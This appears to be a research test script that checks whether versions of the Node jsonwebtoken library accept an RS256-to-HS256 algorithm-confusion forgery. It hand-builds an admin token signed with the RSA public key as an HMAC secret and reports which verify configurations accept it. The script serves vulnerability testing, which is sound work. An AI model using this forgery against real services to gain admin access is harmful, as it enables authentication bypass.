// Cross-language Phase B-ext — Node jsonwebtoken algorithm confusion (RS256→HS256)
// DY-সীমা: attacker শুধু issuer-এর RSA PUBLIC key জানে; সেটাকে HMAC secret বানিয়ে
// HS256-এ role=admin সাইন করে। verifier public key ধরে, HS256+RS256 allow করে।
// ground truth: forged (issuer সাইন করেনি)। ACCEPT+role=admin => শ্রেণী-A (real TP)।
//
// চালাও:  node confusion_jsonwebtoken.js <path-to-jsonwebtoken>
const crypto = require('crypto');
const libPath = require('path').resolve(process.argv[2]);
const jwt = require(libPath);
const ver = require(require('path').join(libPath, 'package.json')).version;

const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
const pubPem = publicKey.export({ type: 'spki', format: 'pem' });

function b64url(buf) { return Buffer.from(buf).toString('base64url'); }

// forged alg-confusion token, hand-built (attacker uses pubPem as HMAC secret)
const header = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
const payload = b64url(JSON.stringify({ role: 'admin', iss: 'real-issuer' }));
const signingInput = `${header}.${payload}`;
const sig = crypto.createHmac('sha256', pubPem).update(signingInput).digest('base64url');
const forged = `${signingInput}.${sig}`;

function tryVerify(label, opts) {
  try {
    const decoded = jwt.verify(forged, pubPem, opts);
    const admin = decoded && decoded.role === 'admin';
    console.log(`  [${admin ? 'A' : '?'}] ${label.padEnd(28)} ACCEPT role=${decoded.role}` +
                (admin ? '  🚨 REAL true-positive' : ''));
    return admin;
  } catch (e) {
    console.log(`  [OK] ${label.padEnd(28)} REJECT ${e.name}: ${String(e.message).slice(0, 45)}`);
    return false;
  }
}

console.log('='.repeat(70));
console.log(`jsonwebtoken ${ver} — algorithm confusion (RS256→HS256)`);
console.log('='.repeat(70));
// (1) unsafe: no algorithms restriction (app just passes the public key)
const a = tryVerify('no algorithms option', undefined);
// (2) unsafe-ish: both RS256 and HS256 allowed (misconfig)
const b = tryVerify("algorithms:['RS256','HS256']", { algorithms: ['RS256', 'HS256'] });
// (3) safe: RS256 only
const c = tryVerify("algorithms:['RS256'] (safe)", { algorithms: ['RS256'] });
const tp = (a || b) ? 1 : 0;
console.log('-'.repeat(70));
console.log(`RESULT\tjsonwebtoken ${ver}\tconfusion_TP=${tp}`);
